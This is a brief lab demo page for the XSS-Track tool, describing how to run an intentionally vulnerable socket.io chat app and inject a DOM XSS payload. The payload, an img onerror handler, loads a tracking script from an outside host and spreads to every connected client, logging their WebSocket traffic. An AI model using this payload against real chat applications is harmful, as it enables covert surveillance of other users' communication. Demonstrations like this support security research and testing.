Sample chat client setup

This is an example of XSS-Track ability to dump WebSockets communication.

This is a modified vulnerable version of socket.io chat application

I've set up a test WebSocket server to go with it here but it won't last long., so you could test it yourself:

Set up

  1. install node.js framework
  2. Get the app sources from github
  3. run the server: 
          $ cd blog-kotowicz-net-examples/track-xss/vuln/socket.io/example
      $ node server.js
  4. run the client in WebSockets compatible browser (Chrome is a safe bet): http://localhost:9999

Injection

The chat message is vulnerable to DOM XSS, use e.g. the following payload to test it:

    <img src=a onerror="s=document.createElement('script');s.src='http://kotowicz.net/xss-track/track.js?debug=1&websocket=1';document.body.appendChild(s);">

(The payload will also distribute to all clilents connected to the chat)

After the injection all WebSockets communication will be logged to console (Ctrl-Shift-I to see the console in Chrome)
